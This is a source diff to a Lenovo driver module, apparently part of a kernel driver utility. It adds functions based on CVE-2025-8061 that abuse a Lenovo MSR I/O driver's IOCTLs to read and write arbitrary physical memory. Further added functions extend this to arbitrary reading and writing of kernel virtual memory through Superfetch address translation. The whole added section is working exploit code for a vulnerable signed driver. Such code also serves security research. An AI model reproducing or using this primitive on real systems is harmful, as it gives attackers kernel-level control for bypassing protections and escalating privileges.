@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2023
+*  (C) COPYRIGHT AUTHORS, 2023 - 2026
 *
 *  TITLE:       LENOVO.CPP
 *
-*  VERSION:     1.31
+*  VERSION:     1.47
 *
-*  DATE:        09 Apr 2023
+*  DATE:        25 Mar 2026
 *
 *  Lenovo driver routines.
 *
@@ -451,4 +451,170 @@ BOOL WINAPI LddRegisterDriver(
     }
 
     return (g_MiPteBase != NULL && g_LddSwapAddress.QuadPart != 0);
+}
+
+//
+// Based on CVE-2025-8061.
+//
+
+/*
+* LnvMsrReadPhysicalMemory
+*
+* Purpose:
+*
+* Read physical memory via Lenovo MSR I/O driver.
+*
+*/
+BOOL WINAPI LnvMsrReadPhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    BOOL bResult = FALSE;
+    ULONG bytesReturned;
+    DWORD lastError;
+    LNVMSRIO_PHYS_READ_REQUEST request;
+
+    if (DeviceHandle == NULL || Buffer == NULL || NumberOfBytes == 0)
+        return FALSE;
+
+    RtlSecureZeroMemory(&request, sizeof(request));
+
+    request.PhysicalAddress = (ULONG64)PhysicalAddress;
+    request.AccessSize = 1;
+    request.Count = NumberOfBytes;
+
+    bytesReturned = 0;
+    SetLastError(ERROR_SUCCESS);
+
+    bResult = supCallDriver(DeviceHandle,
+        IOCTL_LNVMSRIO_READ_PHYSICAL_MEMORY,
+        &request,
+        sizeof(request),
+        Buffer,
+        NumberOfBytes);
+
+    if (!bResult) {
+        lastError = GetLastError();
+        supPrintfEvent(kduEventError,
+            "[!] LnvMsrReadPhysicalMemory failed, win32 error %lu\r\n",
+            lastError);
+    }
+
+    return bResult;
+}
+
+/*
+* LnvMsrWritePhysicalMemory
+*
+* Purpose:
+*
+* Write physical memory via Lenovo MSR I/O driver.
+*
+*/
+BOOL WINAPI LnvMsrWritePhysicalMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR PhysicalAddress,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    BOOL bResult = FALSE;
+    SIZE_T size;
+    DWORD lastError;
+    PLNVMSRIO_PHYS_WRITE_REQUEST request;
+
+    if (DeviceHandle == NULL || Buffer == NULL || NumberOfBytes == 0)
+        return FALSE;
+
+    size = FIELD_OFFSET(LNVMSRIO_PHYS_WRITE_REQUEST, Data) + NumberOfBytes;
+    request = (PLNVMSRIO_PHYS_WRITE_REQUEST)supHeapAlloc(size);
+    if (request == NULL)
+        return FALSE;
+
+    request->PhysicalAddress = (ULONG64)PhysicalAddress;
+    request->AccessSize = 1;
+    request->Count = NumberOfBytes;
+
+    RtlCopyMemory(request->Data, Buffer, NumberOfBytes);
+
+    SetLastError(ERROR_SUCCESS);
+
+    bResult = supCallDriver(DeviceHandle,
+        IOCTL_LNVMSRIO_WRITE_PHYSICAL_MEMORY,
+        request,
+        (ULONG)size,
+        NULL,
+        0);
+
+    if (!bResult) {
+        lastError = GetLastError();
+        supPrintfEvent(kduEventError,
+            "[!] LnvMsrWritePhysicalMemory failed, win32 error %lu\r\n",
+            lastError);
+    }
+
+    supHeapFree(request);
+
+    return bResult;
+}
+
+/*
+* LnvMsrVirtualToPhysical
+*
+* Purpose:
+*
+* Translate virtual address to physical via Superfetch map.
+*
+*/
+BOOL WINAPI LnvMsrVirtualToPhysical(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR VirtualAddress,
+    _Out_ ULONG_PTR * PhysicalAddress)
+{
+    UNREFERENCED_PARAMETER(DeviceHandle);
+
+    return supVirtualToPhysicalWithSuperfetch(VirtualAddress, PhysicalAddress);
+}
+
+/*
+* LnvMsrReadKernelVirtualMemory
+*
+* Purpose:
+*
+* Read kernel virtual memory via Superfetch translation + physical memory read.
+*
+*/
+BOOL WINAPI LnvMsrReadKernelVirtualMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR Address,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
+        Address,
+        Buffer,
+        NumberOfBytes,
+        LnvMsrReadPhysicalMemory);
+}
+
+/*
+* LnvMsrWriteKernelVirtualMemory
+*
+* Purpose:
+*
+* Write kernel virtual memory via Superfetch translation + physical memory write.
+*
+*/
+BOOL WINAPI LnvMsrWriteKernelVirtualMemory(
+    _In_ HANDLE DeviceHandle,
+    _In_ ULONG_PTR Address,
+    _In_ PVOID Buffer,
+    _In_ ULONG NumberOfBytes)
+{
+    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
+        Address,
+        Buffer,
+        NumberOfBytes,
+        LnvMsrWritePhysicalMemory);
 }
